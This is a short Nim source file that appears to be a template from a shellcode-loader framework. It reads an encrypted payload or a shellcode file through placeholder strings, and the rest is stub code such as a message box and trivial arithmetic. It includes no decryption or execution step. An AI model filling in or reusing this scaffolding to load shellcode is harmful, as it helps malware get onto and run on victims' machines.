
import winim/lean
import sequtils

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

when defined(embedded):
    var enctext_int: seq[int] = REPLACE_encryptedPayload
    var enctext: seq[byte] = enctext_int.map(proc(x: int): byte = byte(x))
else:
    var enctext: seq[byte] = toByteSeq(readFile("REPLACE_shellcodeFile"))

# Stuff, that is always used comes in here
# TODO: Add all other nessesary imports from the snippets you're using here
# The existing ones can be removed obviously, as this is exemplary code ;-)

import winim/lean

# TODO: Add all your needed/wanted features in here or in the loader.nim file on disk.

when defined(USE_MESSAGEBOX):
    proc promptMessage() =
        MessageBoxA(0, cast[LPCSTR](cstring("Hello World")), cast[LPCSTR](cstring("Hello")), MB_OK)

when defined(USE_CALCULATION):
    proc randomCalculation() =
        var a = 5
        var b = 10
        echo "The result is: ", a + b

when isMainModule:
    when defined(USE_MESSAGEBOX):
        promptMessage()
    when defined(USE_CALCULATION):
        randomCalculation()
